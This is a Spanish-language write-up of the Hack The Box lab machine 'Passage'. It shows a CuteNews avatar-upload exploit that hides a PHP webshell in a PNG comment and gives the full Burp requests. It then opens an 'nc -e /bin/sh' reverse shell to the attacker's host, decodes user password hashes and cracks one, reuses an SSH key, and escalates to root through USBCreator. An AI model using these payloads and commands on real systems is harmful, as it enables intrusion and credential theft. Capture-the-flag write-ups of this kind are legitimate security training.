---
layout: post
title: Write-Up Máquina Passage HTB
date: 2021-03-06 19:00 +0800
last_modified_at: 2021-03-06 19:10 +0800
tags: [htb, writeup, linux, CuteNews, USBCreator]
toc:  true
---

![Passage-infocard](/assets/imagenes/2021-03-06-Passage-HTB/Passage-infocard.png)

## introducción

La máquina Passage es una máquina de dificultad media en la cual se explota una aplicación web llamada CuteNews para obetener una shell con el usuario www-data. Con esa shell obtendremos acceso a los ficheros del servidor, en los cuales encontraremos las passwords hasheadas de los usarios del sistema. Solo uno de los dos hashes nos dará una contraseña en plano. Una vez hayamos iniciado sesión en la máquina con el primer usuario, tendremos que obtener una clave RSA la cual se comparte entre los dos usuarios, por lo que podremos tener acceso ssh a la máquina. Para la escalada de privilegios, vamos a explotar una herramienta de sistema llamada USBCreator.

---
## Escaneo

![Passage-nmap](/assets/imagenes/2021-03-06-Passage-HTB/Passage-nmap.png)

Esta máquina tiene 2 puertos abiertos:
* Puerto 22: SSH
* Puerto 80: HTTP (Apache 2.4.18)

### Puerto 22 
En el puerto 22 nos encontramos con un servidor ssh. En un principio no tenemos credenciales y no sería vulnerable.

### Puerto 80
En el puerto 80 nos encontramos con una web en la cual se hace referencia a varias tecnologías que luego veremos.

---
## Enumeración

Si accedemos a la web, nos encontramos con un feed de noticias en el que se hace referencia a una tecnologia implementada recientemente. Esta tecnología es [fail2ban](https://es.wikipedia.org/wiki/Fail2ban).

![Passage-news-feed](/assets/imagenes/2021-03-06-Passage-HTB/Passage-news-feed.png)

Si bajamos hasta el final de la página se nos muestra el el CMS sobre el que corre la web que en este caso es CuteNews.

![Passage-CuteNews](/assets/imagenes/2021-03-06-Passage-HTB/Passage-CuteNews.png)

Una vez tenemos esta información, vamos a proceder a buscar algun tipo de punto donde podamos interactuar con el servidor teniendo en cuenta que no podremos hacer ningun tipo de fuzzing ya que el sistema de fail2ban nos bloquea la IP.

Si miramos el codigo fuente de la página vemos un directorio interesante [http://10.10.10.206/CuteNews](http://10.10.10.206/CuteNews).
Si accedemos vemos una página de login en la cual tenemos un boton para registrar una cuenta en la plataforma.

![Passage-login-page](/assets/imagenes/2021-03-06-Passage-HTB/Passage-login-page.png)

Una vez sabemos esto, vamos a buscar exploits para CuteNews.

[CuteNews 2.1.2 - Authenticated Arbitrary File Upload ](https://www.exploit-db.com/exploits/48458)

En este exploit se explica como a traves de la foto de avatar de usuario podemos obtener una injeccion de comandos.

## Explotacón

Para la explotación, vamos lo primero a crear un usuario en la plataforma.

![Passage-Register-user](/assets/imagenes/2021-03-06-Passage-HTB/Passage-Register-user.png)

una vez le demos a register, accederemos a la pagina principal del panel de gestion, en el que podremos gestionar opciones de nuestro usuario como el avatar.

![Passage-user-dashboard](/assets/imagenes/2021-03-06-Passage-HTB/Passage-user-dashboard.png)

Si nos vamos a personal options, nos aparecera la opción de subir nuestra imagen de avatar.

Es aqui donde tenemos la vulnerabilidad, así que vamos a preparar nuestro payload para subirlo y poder ejecutar comandos.

![Passage-Shell-Creation](/assets/imagenes/2021-03-06-Passage-HTB/Passage-Shell-Creation.png)

Con esos dos comandos lo que hacemos es primero generar un fichero png vacio con la utilidad convert de [imagemagick](https://imagemagick.org/index.php) y le metemos en un comentario la interfaz de comandos con la herramienta [exiftool](https://exiftool.org/).

Una vez generada, la subiremos como nuestro avatar a la máquina. Para subirlo, simplemente buscamos el fichero donde lo hayamos.
Todo esto tendremos que hacerlo con burpsuite activo ya que tendremos que modificar la peticion de subida del fichero cambiando la extension de .png a .php.

* Petición Original:

```
POST /CuteNews/index.php HTTP/1.1
Host: 10.10.10.206
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------18797126863564466322517621856
Content-Length: 1701
Origin: http://10.10.10.206
Connection: close
Referer: http://10.10.10.206/CuteNews/index.php?mod=main&opt=personal
Cookie: CUTENEWS_SESSION=58te60j4nv945lcderikrvck64
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="mod"

main
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="opt"

personal
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="__signature_key"

0ad6035b4677dd3ef8e125b730e91508-fr3d1s4nm4r
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="__signature_dsi"

ed61e54fb62549cb18ba5985876659a4
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="editpassword"


-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="confirmpassword"


-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="editnickname"

fr3d1s4nm4r
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="avatar_file"; filename="shell.png"
Content-Type: image/png

PNG

   
IHDR            [GY   gAMA  ±üa    cHRM  z&    ú   è  u0  ê`  :  pºQ<   tRNS  vÍ8   bKGD Ý¤   tIMEå0$m   %tEXtdate:create 2021-03-06T11:28:48+00:00Wôl$   %tEXtdate:modify 2021-03-06T11:28:48+00:00&©Ô   2tEXtComment <?php echo "<pre>"; system($_GET[cmd]); ?>§ññ   IDAT×c`Ü     a%}G    IEND®B`
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="more[site]"


-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="more[about]"


-----------------------------18797126863564466322517621856--
```
* Petición Modificada:

```
POST /CuteNews/index.php HTTP/1.1
Host: 10.10.10.206
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------18797126863564466322517621856
Content-Length: 1701
Origin: http://10.10.10.206
Connection: close
Referer: http://10.10.10.206/CuteNews/index.php?mod=main&opt=personal
Cookie: CUTENEWS_SESSION=58te60j4nv945lcderikrvck64
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="mod"

main
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="opt"

personal
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="__signature_key"

0ad6035b4677dd3ef8e125b730e91508-fr3d1s4nm4r
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="__signature_dsi"

ed61e54fb62549cb18ba5985876659a4
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="editpassword"


-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="confirmpassword"


-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="editnickname"

fr3d1s4nm4r
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="avatar_file"; filename="shell.php"
Content-Type: image/png

PNG

   
IHDR            [GY   gAMA  ±üa    cHRM  z&    ú   è  u0  ê`  :  pºQ<   tRNS  vÍ8   bKGD Ý¤   tIMEå0$m   %tEXtdate:create 2021-03-06T11:28:48+00:00Wôl$   %tEXtdate:modify 2021-03-06T11:28:48+00:00&©Ô   2tEXtComment <?php echo "<pre>"; system($_GET[cmd]); ?>§ññ   IDAT×c`Ü     a%}G    IEND®B`
-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="more[site]"


-----------------------------18797126863564466322517621856
Content-Disposition: form-data; name="more[about]"


-----------------------------18797126863564466322517621856--
```

Si simplemente crearamos un fichero php con nuestro codigo a cañon, nos dara error, ya que el servidor valida el fichero con la cabecera del mismo, por lo que nos dara error. En este caso, la mejor opción para mí es generar la imagen vacía y meter el codigo php en un comentario.

Una vez ya lo tenemos subido al servidor, en burp nos saldrá una segunda petición con la ruta en la cual se guarda el fichero que acabamos de subir.

```
GET /CuteNews/uploads/avatar_fr3d1s4nm4r_shell.php HTTP/1.1
Host: passage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.10.206/CuteNews/index.php
DNT: 1
Sec-GPC: 1
```

Si vamos a esa ruta, ya podremos ejecutar comandos. Para obtener una reverse shell, podemos simplemente ejecutar el siguiente comando a traves del parametro cmd:
* [http://10.10.10.206/CuteNews/uploads/avatar_fr3d1s4nm4r_shell.php?cmd=nc -e /bin/sh 10.10.14.17 1234](http://10.10.10.206/CuteNews/uploads/avatar_fr3d1s4nm4r_shell.php?cmd=nc%20-e%20/bin/sh%2010.10.14.17%201234)


![Passage-revshell-www-data](/assets/imagenes/2021-03-06-Passage-HTB/Passage-revshell-www-data.png)

Una vez tenemos la reverse shell, ya podemos trabajar de una forma más cómoda.

Una vez tenemos todo esto, vamos a enumerar para ver como podemos obtener el usuario. Si miramos en los directorios que estan alrededor de donde estamos ejecutando los comandos, veremos el directorio cdata, en el cual tenemos varios fichero que hacen referencia al os usuarios de la plataforma.

![Passage-cdata-users](/assets/imagenes/2021-03-06-Passage-HTB/Passage-cdata-users.png)

En este caso, niguno de los dos ficheros, nos aporta ninguan informacion relevante a primera vista, pero en el directorio users, si que encontramos fichero que parecen interesantes.

En estos ficheros, encontramos cadenas de texto muy interesantes encodeadas en formato base64. Sabiendo esto vamos a decodearlas para ver que son. 

Empezando por el fichero lines:

* for i in $(cat lines | grep YTo* ); do echo $i | base64 -d; echo ; done;
  * a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}
    a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}
    a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}
    a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}
    a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}
    a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}
    a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}
    a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}
    a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}
    a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}
    a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}
    a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}


Vemos que tenemos una lista de posible usuarios con alguinas contraseñas hasheadas. Si listamos el directorio home de la máquina, veremos que tenemos dois usuarios coincidentes, Nadav y Paul. Ya que tenemos los hashes de sus contraseñas, vamos a ir a crackstation y vamos a ver si podemos ver las pass en claro.

![Passage-pass-crack](/assets/imagenes/2021-03-06-Passage-HTB/Passage-pass-crack.png)

Como podemos ver, la primera password no la encentra y ni siquiera reconoce el tipo de hash que es, pero la segunda, la cual corresponde al usuario paul si que la podemos ver en texto plano, por lo que vamos a intentar loguearnos en el sistema como paul.


![Passage-user-paul](/assets/imagenes/2021-03-06-Passage-HTB/Passage-user-paul.png)


![Passage-user-txt](/assets/imagenes/2021-03-06-Passage-HTB/Passage-user-txt.png)

Ya tendriamos el user.

vamos a enumerar la maquina con el usuario paul, ya que casi no tenemos permisos para realizar acciones sobre la máquina.

---
## Movimiento Lateral

Si en el directorio home del usuario paul vamos al directorio .ssh, vemos que tenemos una clave privada para conectarnos por ssh y dentro del fichero authorized_keys, vemos tambien esa misma clave privada junto con las claves públicas de los usarios autorizados. Vamos a copiar la clave privada a nuestra máquina y vamos a conectarnos.

Es muy importante recordar que para utilizar las claves privadas para conectarnos por ssh estas deben tener solamente permisos de lectura y escritura solo por el owner(chmod 600 id_rsa).

Una vez hecho, yanos podemos conectar como paul por ssh.

![Passage-ssh-paul](/assets/imagenes/2021-03-06-Passage-HTB/Passage-ssh-paul.png)

Ya que sabemos que la clave privada funciona con el usuario paul, vamos a probar tambien con el usuario nadav, ya que est rfaro que tengamos una clave privada dentro de las claves autorizadas.

![Passaga-nadav-ssh](/assets/imagenes/2021-03-06-Passage-HTB/Passaga-nadav-ssh.png)

Efectivamente la clave que hemos obtenido es valida para los dos usuarios.


---
## Escalada de privilegios

Vamos a enumerar la máquina para ver por donde podemos escalar y obtener root.

Lo primero que vamos a analizar, es la [pertenencia a grupos](https://wiki.debian.org/SystemGroups). En esta caso, el usario nadav pertenece a los siguientes:

* nadav
* adm: Este grupo normalmente se otorga a aquellos usuarios encargados de realizar tareas de monitorización, ya que pueden leer los logs que se encuentran en el directorio /var/log.
* cdrom: Los usuarios pertenecientes a este grupo, tienen acceso a a las unidades de cdrom y unidades ópticas. 
* sudo: los usuarios pertenecientes a este grupo, pueden ejecutar sudo en la máquina.
* dip: Los usuarios que pertenecen a este grupo, pueden utilizar herramientas relacionadas con la tecnología Dial-Up como ppp.
* plugdev: Los usuarios pertenecientes a este grupo, pueden montar y desmontar unidades extraibles con alguna restricción.
* lpadmin: Los usuarios pertenecientes a este grupo tienen permiso para gestionar impresoras y jobs en cola de otros usuarios.
* sambashare


Una vez sabemos esto, vamos a seguir enumerando para ver si hay algun servicio que podamos explotar.

![Passage-usb-creator-linpeas](/assets/imagenes/2021-03-06-Passage-HTB/Passage-usb-creator-linpeas.png)

El script de enumeración [LinPEAS](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh) nos indica que podemos escalar privilegios a traves del la utilidad de USBCreator.


![Passage-copy-id_rsa-root](/assets/imagenes/2021-03-06-Passage-HTB/Passage-copy-id_rsa-root.png)

Una vez hemos obtenido la clave privada de root vamos a conectarnos por ssh a la máquina y ya leer la flag de root.

![Passage-root](/assets/imagenes/2021-03-06-Passage-HTB/Passage-root.png)



